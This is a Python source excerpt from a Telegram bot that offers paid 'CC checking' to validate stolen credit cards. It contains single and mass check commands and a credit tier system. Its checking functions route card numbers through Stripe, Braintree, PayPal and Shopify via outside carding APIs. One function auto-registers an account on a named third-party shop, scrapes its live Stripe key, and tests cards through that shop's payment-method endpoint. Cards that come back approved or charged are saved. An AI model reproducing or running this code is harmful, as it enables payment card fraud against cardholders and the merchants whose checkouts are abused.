✅ /sh <card>
└ Check single CC on your sites

✅ /msh <cards>
└ Mass check multiple CCs

✅ /mtxt (reply to .txt)
 └ (Premium user only)🔥
 └ Mass check from text file

**Note:** Add sites first using /add <site>

**Site Management:**
• /add - Add Shopify sites
• /sites - View your sites
• /check - Refresh your sites

**Shopify Self (With Proxy)**
/psh or .psh ⇾ Check a single CC with proxy.
/pmsh or .pmsh ⇾ Check multiple CCs with proxy.
/ptxt or .ptxt ⇾ Check CCs from a .txt file with proxy."""
    
    buttons = [
        [Button.inline("Back", b"charge_gates")]
    ]
    
    await event.edit(shopify_text, buttons=buttons)

# OLD /auth command removed - Use credit system commands instead (/premium, /pro)

# OLD /key command removed - New credit-based /key command is in CREDIT SYSTEM ADMIN COMMANDS section

# OLD /redeem command removed - New credit-based /redeem command is in CREDIT SYSTEM USER COMMANDS section

@client.on(events.NewMessage(pattern=r'^/add(\s|$)'))
@require_membership
async def add_site(event):
    # Command disabled silently
    return
    
    # Check if command is enabled
    if not is_command_enabled("add"):
        return
    
    # Check group authorization FIRST
    if not await check_group_authorization(event):
        return
    
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message(), link_preview=False)
    try:
        add_text = event.raw_text[4:].strip()
        if not add_text: return await event.reply("𝙁𝙤𝙧𝙢𝙚𝙩: /add site.com site.com", link_preview=False)
        sites_to_add = extract_urls_from_text(add_text)
        if not sites_to_add: return await event.reply("❌ 𝙉𝙤 𝙫𝙖𝙡𝙞𝙙 𝙪𝙧𝙡𝙨/𝙙𝙤𝙢𝙖𝙞𝙣𝙨 𝙛𝙤𝙪𝙣𝙙!", link_preview=False)
        
        # Start checking sites
        asyncio.create_task(process_add_with_check(event, sites_to_add))
        
    except Exception as e: await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}", link_preview=False)

async def process_add_with_check(event, sites_to_add):
    """Check sites and add only working ones"""
    try:
        # Load existing sites
        sites = await load_json(SITE_FILE)
        user_sites = sites.get(str(event.sender_id), [])
        
        total_sites = len(sites_to_add)
        checked = 0
        working_sites = []
        dead_sites = []
        already_exists = []
        
        # Check which sites already exist
        sites_to_check = []
        for site in sites_to_add:
            if site in user_sites:
                already_exists.append(site)
            else:
                sites_to_check.append(site)
        
        if not sites_to_check and already_exists:
            return await event.reply("\n".join(f"⚠️ 𝘼𝙡𝙧𝙚𝙖𝙙𝙮 𝙀𝙭𝙞𝙨𝙩𝙨: {s}" for s in already_exists), link_preview=False)
        
        status_msg = await event.reply(f"```🔍 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 {len(sites_to_check)} 𝙨𝙞𝙩𝙚𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙖𝙙𝙙𝙞𝙣𝙜...```", link_preview=False)
        
        # Check sites in batches
        batch_size = 10
        for i in range(0, len(sites_to_check), batch_size):
            batch = sites_to_check[i:i+batch_size]
            tasks = []
            
            for site in batch:
                tasks.append(test_single_site(site))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for site, result in zip(batch, results):
                checked += 1
                if isinstance(result, Exception):
                    result = {"status": "dead", "response": f"Exception: {str(result)}", "site": site, "price": "-"}
                
                if result["status"] == "working":
                    # Check if price is >= $0.98
                    price_str = result["price"]
                    try:
                        # Extract numeric value from price (e.g., "$1.00" -> 1.00)
                        if price_str and price_str != "-":
                            price_value = float(price_str.replace("$", "").replace(",", "").strip())
                            if price_value < 0.98:
                                # Reject sites with price < $0.98
                                dead_sites.append({"site": site, "price": result["price"], "reason": "Price too low (< $0.98)"})
                            else:
                                working_sites.append({"site": site, "price": result["price"]})
                        else:
                            # If price is unknown, reject it
                            dead_sites.append({"site": site, "price": result["price"], "reason": "Price unknown"})
                    except:
                        # If price parsing fails, reject it
                        dead_sites.append({"site": site, "price": result["price"], "reason": "Invalid price format"})
                else:
                    dead_sites.append({"site": site, "price": result["price"]})
                
                working_count = len(working_sites)
                dead_count = len(dead_sites)
                
                status_text = (
                    f"```🔍 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨...\n\n"
                    f"📊 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨: [{checked}/{len(sites_to_check)}]\n"
                    f"✅ 𝙒𝙤𝙧𝙠𝙞𝙣𝙜: {working_count}\n"
                    f"❌ 𝘿𝙚𝙖𝙙: {dead_count}\n\n"
                    f"🔄 𝘾𝙪𝙧𝙧𝙚𝙣𝙩: {site}\n"
                    f"📝 𝙎𝙩𝙖𝙩𝙪𝙨: {result['status'].upper()}\n"
                    f"💰 𝙋𝙧𝙞𝙘𝙚: {result['price']}\n"
                    f"```"
                )
                
                try:
                    await status_msg.edit(status_text)
                except:
                    pass
                
                await asyncio.sleep(0.1)
        
        # Add only working sites to database
        if working_sites:
            for site_data in working_sites:
                user_sites.append(site_data['site'])
            
            sites[str(event.sender_id)] = user_sites
            await save_json(SITE_FILE, sites)
        
        # Build final response with length limit
        final_text = f"✅ **𝙎𝙞𝙩𝙚 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!**\n\n📊 **𝙍𝙚𝙨𝙪𝙡𝙩𝙨:**\n"
        
        max_length = 3500  # Leave room for formatting
        
        if working_sites:
            final_text += f"✅ **𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨 𝘼𝙙𝙙𝙚𝙙:** {len(working_sites)}\n"
            for idx, site_data in enumerate(working_sites, 1):
                line = f"{idx}. `{site_data['site']}` - {site_data['price']}\n"
                if len(final_text) + len(line) > max_length:
                    final_text += f"... and {len(working_sites) - idx + 1} more\n"
                    break
                final_text += line
            final_text += "\n"
        
        if dead_sites and len(final_text) < max_length:
            final_text += f"❌ **𝘿𝙚𝙖𝙙/𝙍𝙚𝙟𝙚𝙘𝙩𝙚𝙙 𝙎𝙞𝙩𝙚𝙨 (𝙉𝙤𝙩 𝘼𝙙𝙙𝙚𝙙):** {len(dead_sites)}\n"
            for idx, site_data in enumerate(dead_sites, 1):
                reason = site_data.get('reason', '')
                if reason:
                    line = f"{idx}. `{site_data['site']}` - {site_data['price']} ({reason})\n"
                else:
                    line = f"{idx}. `{site_data['site']}` - {site_data['price']}\n"
                if len(final_text) + len(line) > max_length:
                    final_text += f"... and {len(dead_sites) - idx + 1} more\n"
                    break
                final_text += line
            final_text += "\n"
        
        if already_exists and len(final_text) < max_length:
            final_text += f"⚠️ **𝘼𝙡𝙧𝙚𝙖𝙙𝙮 𝙀𝙭𝙞𝙨𝙩𝙨:** {len(already_exists)}\n"
            for idx, site in enumerate(already_exists, 1):
                line = f"{idx}. `{site}`\n"
                if len(final_text) + len(line) > max_length:
                    final_text += f"... and {len(already_exists) - idx + 1} more\n"
                    break
                final_text += line
        
        if not working_sites and not dead_sites and not already_exists:
            final_text = "❌ 𝙉𝙤 𝙨𝙞𝙩𝙚𝙨 𝙩𝙤 𝙖𝙙𝙙!"
        
        try:
            await status_msg.edit(final_text)
        except Exception as e:
            # If still too long, send summary only
            summary = f"✅ **𝙎𝙞𝙩𝙚 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!**\n\n"
            summary += f"✅ Working: {len(working_sites)}\n"
            summary += f"❌ Dead: {len(dead_sites)}\n"
            summary += f"⚠️ Already Exists: {len(already_exists)}"
            await status_msg.edit(summary)
        
    except Exception as e:
        await event.reply(f"❌ Error: {e}", link_preview=False)

# /rm command disabled - No reply mode
# @client.on(events.NewMessage(pattern=r'^/rm(\s|$)'))
# @require_membership
# async def remove_site(event):
#     # Check if command is enabled
#     if not is_command_enabled("rm"):
#         return
#     
#     # Check group authorization FIRST
#     if not await check_group_authorization(event):
#         return
#     
#     can_access, access_type = await can_use(event.sender_id, event.chat)
#     if access_type == "banned": return await event.reply(banned_user_message(), link_preview=False)
#     try:
#         rm_text = event.raw_text[3:].strip()
#         if not rm_text: return await event.reply("❌ Format: /rm site.com", link_preview=False)
#         sites_to_remove = extract_urls_from_text(rm_text)
#         if not sites_to_remove: return await event.reply("❌ 𝙉𝙤 𝙫𝙖𝙡𝙞𝙙 𝙪𝙧𝙡𝙨/𝙙𝙤𝙢𝙖𝙞𝙣𝙨 𝙛𝙤𝙪𝙣𝙙!", link_preview=False)
#         sites = await load_json(SITE_FILE)
#         user_sites = sites.get(str(event.sender_id), [])
#         removed_sites = []
#         not_found_sites = []
#         for site in sites_to_remove:
#             if site in user_sites:
#                 user_sites.remove(site)
#                 removed_sites.append(site)
#             else: not_found_sites.append(site)
#         sites[str(event.sender_id)] = user_sites
#         await save_json(SITE_FILE, sites)
#         response_parts = []
#         if removed_sites: response_parts.append("\n".join(f"✅ 𝙍𝙚𝙢𝙤𝙫𝙚𝙙: {s}" for s in removed_sites))
#         if not_found_sites: response_parts.append("\n".join(f"❌ 𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙: {s}" for s in not_found_sites))
#         if response_parts: await event.reply("\n\n".join(response_parts), link_preview=False)
#         else: await event.reply("❌ 𝙉𝙤 𝙨𝙞𝙩𝙚𝙨 𝙬𝙚𝙧𝙚 𝙧𝙚𝙢𝙤𝙫𝙚𝙙!", link_preview=False)
#     except Exception as e: await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}", link_preview=False)

# ===== STRIPE AUTH GATEWAY (OnyxEnv API) =====

async def check_stripe_php_gateway(card, user_id=None):
    """Check card using PHP Stripe Auth Gateway"""
    try:
        import os
        
        # Get gateway URL from environment or use default
        gateway_url = os.environ.get("STRIPE_GATEWAY_URL", "http://localhost:8000/stripe_auth_gateway.php")
        
        # Check if same card was checked recently by this user
        if user_id:
            current_time = time.time()
            last_check = LAST_CHECKED_CARDS.get(user_id, {})
            last_card = last_check.get("card", "")
            last_time = last_check.get("time", 0)
            
            # If same card checked within 45 seconds
            if last_card == card and (current_time - last_time) < 45:
                wait_time = int(45 - (current_time - last_time))
                return {
                    "Response": f"This card was already checked previously. Please wait {wait_time} seconds before checking again.",
                    "Gateway": "Stripe Auth",
                    "Status": "rate_limited"
                }
        
        # Make request to PHP gateway
        timeout = aiohttp.ClientTimeout(total=120)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.post(
                gateway_url,
                json={"card": card},
                headers={"Content-Type": "application/json"}
            ) as response:
                if response.status != 200:
                    return {"Response": f"Gateway Error: {response.status}", "Gateway": "Stripe Auth", "Status": "error"}
                
                result = await response.json()
                
                # Update last checked card info on successful check
                if user_id:
                    LAST_CHECKED_CARDS[user_id] = {
                        "card": card,
                        "time": time.time()
                    }
                
                # Return result
                return {
                    "Response": result.get("response", "Unknown response"),
                    "Gateway": result.get("gateway", "Stripe Auth"),
                    "Status": result.get("status", "unknown").lower()
                }
                
    except Exception as e:
        return {"Response": f"Error: {str(e)}", "Gateway": "Stripe Auth", "Status": "error"}

# Global variable to store session cookie
BRAINTREE_SESSION = {
    'cookie': None,
    'last_refresh': 0
}

def load_keys():
    """Load keys from keys.json file"""
    try:
        with open('keys.json', 'r') as f:
            return json.load(f)
    except:
        return {}

async def get_braintree_session():
    """Get Braintree session cookie from keys.json (manual cookie)"""
    global BRAINTREE_SESSION
    
    # Check if cookie is still valid (refresh every 20 minutes)
    current_time = time.time()
    if BRAINTREE_SESSION['cookie'] and (current_time - BRAINTREE_SESSION['last_refresh']) < 1200:
        return BRAINTREE_SESSION['cookie']
    
    try:
        # Get manual cookie from keys.json
        keys_data = load_keys()
        manual_cookie = keys_data.get('braintree_cookie', '')
        
        if manual_cookie:
            BRAINTREE_SESSION['cookie'] = manual_cookie
            BRAINTREE_SESSION['last_refresh'] = current_time
            print(f"✅ Using Braintree cookie from keys.json")
            return manual_cookie
        else:
            print("⚠️ Braintree cookie not found in keys.json")
            print("💡 Add 'braintree_cookie' to keys.json with your PHPSESSID value")
            return None
        
    except Exception as e:
        print(f"❌ Braintree cookie error: {e}")
        return None

async def check_braintree_gateway(card, user_id=None):
    """Check card using md-tech-gen Braintree API with auto-login"""
    try:
        # Parse card
        parts = card.split("|")
        if len(parts) != 4:
            return {"Response": "Invalid format. Use: 4111111111111111|12|2025|123", "Gateway": "Braintree", "Status": "error"}
        
        cc, mm, yy, cvc = parts
        
        # Convert year to 2 digits if needed
        if len(yy) == 4:
            yy = yy[-2:]
        
        # Format card for API
        card_formatted = f"{cc}|{mm}|{yy}|{cvc}"
        
        # Get fresh session cookie
        session_cookie = await get_braintree_session()
        
        if not session_cookie:
            return {"Response": "Login failed - Check credentials in code", "Gateway": "Braintree", "Status": "error"}
        
        # Use md-tech-gen Braintree API
        api_url = "https://www.md-tech-gen.tech/api/braintree/b3auth2.php"
        
        # API parameters
        params = {
            'cc': card_formatted,
            'useProxy': '0',
            'hitSender': 'both',
            'site': ''
        }
        
        # API headers
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://www.md-tech-gen.tech/app/checkers',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36'
        }
        
        # Use fresh cookie
        cookies = {
            'PHPSESSID': session_cookie
        }
        
        # Make API request using aiohttp
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(api_url, params=params, headers=headers, cookies=cookies) as response:
                if response.status != 200:
                    return {"Response": f"API Error: {response.status}", "Gateway": "Braintree", "Status": "error"}
                
                # Get response text first
                response_text = await response.text()
                
                # Check if redirected to login (session expired)
                if 'Sign in' in response_text or 'login' in response_text.lower():
                    # Force refresh session
                    BRAINTREE_SESSION['cookie'] = None
                    BRAINTREE_SESSION['last_refresh'] = 0
                    return {"Response": "Session expired - Retry command", "Gateway": "Braintree", "Status": "error"}
                
                # Try to parse JSON
                try:
                    result = json.loads(response_text)
                    response_message = result.get('response', 'No response').strip()
                except json.JSONDecodeError:
                    return {"Response": "API Error - Invalid response format", "Gateway": "Braintree", "Status": "error"}
                
                # Determine status based on response
                response_lower = response_message.lower()
                
                if any(keyword in response_lower for keyword in ['approved', 'success', 'valid', 'cvv', 'insufficient']):
                    status = "approved"
                elif any(keyword in response_lower for keyword in ['declined', 'invalid', 'failed']):
                    status = "declined"
                else:
                    status = "unknown"
                
                return {
                    "Response": response_message,
                    "Gateway": "Braintree Auth",
                    "Status": status
                }
    
    except Exception as e:
        return {"Response": f"Error: {str(e)}", "Gateway": "Braintree", "Status": "error"}

async def check_stripe_onyxenv(card, user_id=None, proxy=None):
    """Check card using OnyxEnv Stripe Auth API"""
    try:
        parts = card.split("|")
        if len(parts) != 4:
            return {"Response": "Invalid card format", "Gateway": "Stripe Auth", "Status": "error"}
        
        # OnyxEnv API
        api_url = "https://onyxenvstripeauth.onrender.com/process-card"
        params = {"cc": card}
        
        # Direct connection only (no proxy support)
        timeout = aiohttp.ClientTimeout(total=60, connect=30)
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(api_url, params=params) as response:
                if response.status != 200:
                    return {"Response": f"API Error: {response.status}", "Gateway": "Stripe Auth", "Status": "error"}
                
                # Parse JSON response
                result = await response.json()
                status = result.get("status", "unknown").lower()
                response_msg = result.get("response", "No response")
                
                # Clean up response
                if "Card Added" in response_msg or "Payment Method" in response_msg:
                    response_msg = "Card Added Successfully"
                
                return {
                    "Response": response_msg,
                    "Gateway": "Stripe Auth",
                    "Status": status
                }
    
    except asyncio.TimeoutError:
        return {"Response": "API Timeout - Server is slow or down", "Gateway": "Stripe Auth", "Status": "error"}
    except aiohttp.ClientError as e:
        error_msg = str(e)
        if "timeout" in error_msg.lower():
            return {"Response": "Connection Timeout - API not responding", "Gateway": "Stripe Auth", "Status": "error"}
        return {"Response": f"Connection Error: {error_msg[:60]}", "Gateway": "Stripe Auth", "Status": "error"}
    except Exception as e:
        return {"Response": f"Error: {str(e)[:60]}", "Gateway": "Stripe Auth", "Status": "error"}

# ===== STRIPE AUTH GATEWAY (Multilit Bookshop - DEPRECATED) =====

async def check_stripe_multilit(card):
    """Check card using Frags2Fishes Stripe gateway"""
    try:
        parts = card.split("|")
        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
        n = n.replace(" ", "")
        
        # Generate random user
        user = f"user{random.randint(1000,9000)}"
        email = f"{user}@gmail.com"
        
        # Step 1: Register account
        async with aiohttp.ClientSession() as session:
            # Get registration page
            url = 'http://frags2fishes.com/my-account/'
            headers_get = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            }
            
            async with session.get(url, headers=headers_get) as response:
                text = await response.text()
                # Try multiple patterns for nonce
                match = re.search(r'name="woocommerce-register-nonce" value="([a-z0-9]+)"', text)
                if not match:
                    match = re.search(r'id="woocommerce-register-nonce"[^>]*value="([a-z0-9]+)"', text)
                if not match:
                    return {"Response": "Failed to get registration nonce", "Gateway": "Stripe Multilit"}
                reg_nonce = match.group(1)
            
            # Register account
            data = {
                'email': email,
                'password': user,
                'woocommerce-register-nonce': reg_nonce,
                '_wp_http_referer': '/my-account/',
                'register': 'Register',
            }
            
            headers_post = {
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'http://frags2fishes.com',
                'referer': 'http://frags2fishes.com/my-account/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            }
            
            async with session.post(url, data=data, headers=headers_post, allow_redirects=True) as response:
                if response.status != 200 or "login" in str(response.url) or "register" in str(response.url):
                    return {"Response": "Registration failed", "Gateway": "Stripe Multilit"}
            
            # Step 2: Get Stripe keys
            async with session.get('http://frags2fishes.com/my-account/payment-methods/', headers=headers_get) as response:
                text = await response.text()
                pk_live_match = re.search(r'pk_live_[a-zA-Z0-9]+', text)
                addnonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', text)
                
                if not pk_live_match or not addnonce_match:
                    return {"Response": "Failed to get Stripe keys", "Gateway": "Stripe Multilit"}
                
                pk_live = pk_live_match.group(0)
                addnonce = addnonce_match.group(1)
            
            # Step 3: Create payment method on Stripe
            stripe_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            }
            
            stripe_data = (
                f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}'
                f'&allow_redisplay=unspecified&billing_details[address][country]=US'
                f'&key={pk_live}'
            )
            
            async with session.post('https://api.stripe.com/v1/payment_methods', 
                                   headers=stripe_headers, data=stripe_data) as response:
                json_resp = await response.json()
                
                if response.status != 200:
                    # Parse Stripe error
                    error = json_resp.get('error', {})
                    error_code = error.get('code', '')
                    error_msg = error.get('message', 'Card declined')
                    
                    # Map common Stripe errors
                    if error_code == 'invalid_number' or 'number' in error_msg.lower():
                        return {"Response": "Invalid card number", "Gateway": "Stripe Multilit", "Status": "declined"}
                    elif error_code == 'invalid_expiry_month' or 'expiry' in error_msg.lower():
                        return {"Response": "Invalid expiry date", "Gateway": "Stripe Multilit", "Status": "declined"}
                    elif error_code == 'invalid_cvc' or 'cvc' in error_msg.lower():
                        return {"Response": "Invalid CVC", "Gateway": "Stripe Multilit", "Status": "declined"}
                    else:
                        return {"Response": error_msg, "Gateway": "Stripe Multilit", "Status": "declined"}
                
                pm_id = json_resp.get('id')
                if not pm_id:
                    error_msg = json_resp.get('error', {}).get('message', 'Card declined')
                    return {"Response": error_msg, "Gateway": "Stripe Multilit", "Status": "declined"}
            
            # Step 4: Confirm setup intent
            confirm_headers = {
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'http://frags2fishes.com',
                'referer': 'http://frags2fishes.com/my-account/add-payment-method/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }
            
            confirm_data = {
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': pm_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': addnonce,
            }
            
            async with session.post('http://frags2fishes.com/wp-admin/admin-ajax.php',
                                   headers=confirm_headers, data=confirm_data) as response:
                if response.status != 200:
                    return {"Response": f"HTTP {response.status}", "Gateway": "Stripe Multilit"}
                
                resp_json = await response.json()
                
                if resp_json.get('success'):
                    return {"Response": "APPROVED", "Gateway": "Stripe Multilit", "Status": "approved"}
                
                if resp_json.get('data', {}).get('requires_action'):
                    return {"Response": "3DS REQUIRED", "Gateway": "Stripe Multilit", "Status": "3ds"}
                
                error_message = (
                    resp_json.get('data', {}).get('message') or
                    resp_json.get('message') or
                    "DECLINED"
                )
                return {"Response": error_message, "Gateway": "Stripe Multilit", "Status": "declined"}
                
    except Exception as e:
        return {"Response": f"Error: {str(e)}", "Gateway": "Stripe Multilit"}

@client.on(events.NewMessage(pattern=r'(?i)^[/.]st(\s|$)'))
@require_membership
async def st(event):
    # Check group authorization FIRST
    if not await check_group_authorization(event):
        return
    
    # Check if command is enabled
    if not is_command_enabled("st"):
        return await event.reply("⚠️ This command is currently disabled by admin.", link_preview=False)
    
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message(), link_preview=False)
    if not can_access:
        buttons = [[Button.url("🚀 Join Group", "https://t.me/+zsDNOaFO-_tlZjA1")]]
        return await event.reply("❌ Insufficient Credits!\n\n(Free check available in group)", buttons=buttons, link_preview=False)
    
    asyncio.create_task(process_st_card(event, access_type))

@require_membership
async def pp_command(event):
    # Check group authorization
    if not await check_group_authorization(event):
        return
    
    # Check if command is enabled
    if not is_command_enabled("pp"):
        return await event.reply("⚠️ This command is currently disabled by admin.", link_preview=False)
    
    # Check access
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message(), link_preview=False)
    if not can_access:
        buttons = [[Button.url("🚀 Join Group", "https://t.me/+zsDNOaFO-_tlZjA1")]]
        return await event.reply("❌ Insufficient Credits!\\n\\n(Free check available in group)", buttons=buttons, link_preview=False)
    
    # Extract card
    card = None
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        card = extract_card(replied_msg.text)
    else:
        card = extract_card(event.raw_text)
    
    if not card:
        return await event.reply("Format: /pp 4111111111111111|12|2025|123\n\nOr reply to a message containing card details", link_preview=False)
    
    # Loading animation
    start_time = time.time()
    loading_msg = None
    
    async def animate_loading():
        nonlocal loading_msg
        loading_states = ["■", "■■", "■■■", "■■■■"]
        i = 0
        while True:
            try:
                current_msg = f"""- **CC**: `{card}`
- **Gateway** → PayPal
- **Response**: {loading_states[i % 4]}"""
                if loading_msg is None:
                    loading_msg = await event.reply(current_msg, parse_mode="Markdown", link_preview=False)
                else:
                    await loading_msg.edit(current_msg, parse_mode="Markdown")
                await asyncio.sleep(0.4)
                i += 1
            except asyncio.CancelledError:
                break
            except:
                break
    
    loading_task = asyncio.create_task(animate_loading())
    
    try:
        # Check card using PayPal Gateway
        res = await check_paypal_gateway(card)
        
        loading_task.cancel()
        await asyncio.sleep(0.3)
        
        if loading_msg is None:
            loading_msg = await event.reply("Processing...", link_preview=False)
        
        elapsed_time = round(time.time() - start_time, 2)
        
        # Get BIN info
        bin_info = await lookup_bin(card.split('|')[0])
        brand = bin_info.get('network', 'UNKNOWN').upper()
        bin_type = bin_info.get('card_type', 'UNKNOWN').upper()
        level = bin_info.get('tier', 'UNKNOWN').upper()
        bank = bin_info.get('bank', 'UNKNOWN').upper()
        country = bin_info.get('country', 'UNKNOWN')
        flag = bin_info.get('flag', '🏳️')
        
        # Determine status
        api_status = res.get('Status', 'unknown').lower()
        response_text = res.get('Response', 'No response')
        
        if api_status == "charged":
            status_display = "CHARGED 💎"
            await save_approved_card(card, "CHARGED", response_text, "PayPal", "$2")
        elif api_status == "approved":
            status_display = "APPROVED ✅"
            await save_approved_card(card, "APPROVED", response_text, "PayPal", "-")
        elif api_status == "declined":
            status_display = "DECLINED ❌"
        else:
            status_display = "ERROR ⚠️"
        
        # Format message
        msg = f"""```
✦ [/pp] [ #PayPal ]
```**CC**: `{card}`
**Status**: {status_display}
**Response**: {response_text}
**Gateway** → {res.get('Gateway', 'PayPal')}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country.upper()} {flag}

Elapsed time: {elapsed_time} seconds"""
        
        try:
            await loading_msg.edit(msg, parse_mode='Markdown', link_preview=False)
        except:
            await loading_msg.edit(msg.replace('`', '').replace('*', ''))
            
    except Exception as e:
        try:
            loading_task.cancel()
        except:
            pass
        if loading_msg:
            await loading_msg.delete()
        await event.reply(f"❌ Error: {e}", link_preview=False)

# ===== MASS PAYPAL CHECK COMMAND =====

ACTIVE_MPP_PROCESSES = {}

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mpp(\s|$)'))
@require_membership
async def mpp_command(event):
    """Mass PayPal card check"""
    # Check group authorization
    if not await check_group_authorization(event):
        return
    
    # Check if command is enabled
    if not is_command_enabled("mpp"):
        return await event.reply("⚠️ This command is currently disabled by admin.", link_preview=False)
    
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message(), link_preview=False)
    if not can_access:
        buttons = [[Button.url("🚀 Join Group", "https://t.me/+zsDNOaFO-_tlZjA1")]]
        return await event.reply("❌ Insufficient Credits!\n\n(Free check available in group)", buttons=buttons, link_preview=False)
    
    # Check if user already has an active /mpp process
    if event.sender_id in ACTIVE_MPP_PROCESSES:
        return await event.reply("⏳ Wait! Your previous /mpp is still checking...", link_preview=False)
    
    cards = []
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: cards = extract_all_cards(replied_msg.text)
        if not cards: return await event.reply("Couldn't extract valid cards from replied message\n\nFormat: /mpp 4111111111111111|12|2025|123 4111111111111111|12|2025|123", link_preview=False)
    else:
        cards = extract_all_cards(event.raw_text)
    if not cards: return await event.reply("Format: /mpp 4111111111111111|12|2025|123 4111111111111111|12|2025|123 4111111111111111|12|2025|123\n\nOr reply to a message containing multiple cards", link_preview=False)
    
    # Check mass checking limit
    if event.sender_id not in ADMIN_ID:
        if len(cards) > 15:
            return await event.reply("⚠️ Mass checking limit: 15 cards", link_preview=False)
    
    # Set limits
    max_cards = get_cc_limit(access_type, event.sender_id)
    if len(cards) > max_cards:
        cards = cards[:max_cards]
        total_found = len(extract_all_cards(event.raw_text if not event.reply_to_msg_id else replied_msg.text))
        await event.reply(f"``` ⚠️ Only checking first {max_cards} cards out of {total_found} provided.```", link_preview=False)
    
    asyncio.create_task(process_mpp_cards(event, cards, access_type))

async def process_mpp_cards(event, cards, access_type):
    user_id = event.sender_id
    
    # Mark process as active
    ACTIVE_MPP_PROCESSES[user_id] = True
    
    try:
        start_total_time = time.time()
        all_results = []
        
        # Get user info
        try:
            user = await client.get_entity(event.sender_id)
            username = user.first_name if user.first_name else "User"
            user_username = user.username if user.username else None
            if user_username:
                user_link = f"[{username}](https://t.me/{user_username})"
            else:
                user_link = username
        except:
            username = "User"
            user_link = username
        
        # Get user plan
        user_data = await get_user_credits(event.sender_id)
        plan = user_data.get('plan', 'Free')
        if plan == "VIP":
            access_label = "VIP 💎"
        elif plan == "VIP":
            access_label = "VIP 💎"
        else:
            access_label = "Free 🆓"
        
        # Create initial message
        initial_msg = f"```\n✦ [$mpp] [ #PayPal_Mass ]\n```"
        if event.sender_id in ADMIN_ID:
            initial_msg += f"**$mpp limit {len(cards)}/50** - Checked: 0/{len(cards)}\n"
        else:
            initial_msg += f"**$mpp limit {len(cards)}/15** - Checked: 0/{len(cards)}\n"
        initial_msg += f"━ ━ ━ ━ ━ ━━━ ━ ━ ━ ━ ━\n"
        initial_msg += "Processing cards...\n"
        
        sent_msg = await event.reply(initial_msg, link_preview=False)
        
        # Process cards
        completed_count = 0
        
        for card in cards:
            if user_id not in ACTIVE_MPP_PROCESSES:
                break
            
            try:
                result = await check_paypal_gateway(card)
            except Exception as e:
                result = {"Response": f"Exception: {str(e)}", "Gateway": "PayPal", "Status": "error"}
            
            response_text = result.get("Response", "").lower()
            api_status = result.get("Status", "").lower()
            gateway = result.get("Gateway", "PayPal")
            
            # Determine status
            if api_status == "charged":
                status_display = "CHARGED 💎"
                await save_approved_card(card, "CHARGED", result.get('Response'), gateway, "$2")
            elif api_status == "approved":
                status_display = "APPROVED ✅"
                await save_approved_card(card, "APPROVED", result.get('Response'), gateway, "-")
            elif api_status == "declined":
                status_display = "DECLINED ❌"
            else:
                status_display = "API ERROR ⚠️"
            
            # Add to results
            all_results.append({
                "card": card,
                "status": status_display,
                "response": result.get("Response", "No response"),
                "gateway": gateway
            })
            
            completed_count += 1
            
            # Update message every card
            try:
                update_msg = f"```\n✦ [$mpp] [ #PayPal_Mass ]\n```"
                if event.sender_id in ADMIN_ID:
                    update_msg += f"**$mpp limit {len(cards)}/50** - Checked: {completed_count}/{len(cards)}\n"
                else:
                    update_msg += f"**$mpp limit {len(cards)}/15** - Checked: {completed_count}/{len(cards)}\n"
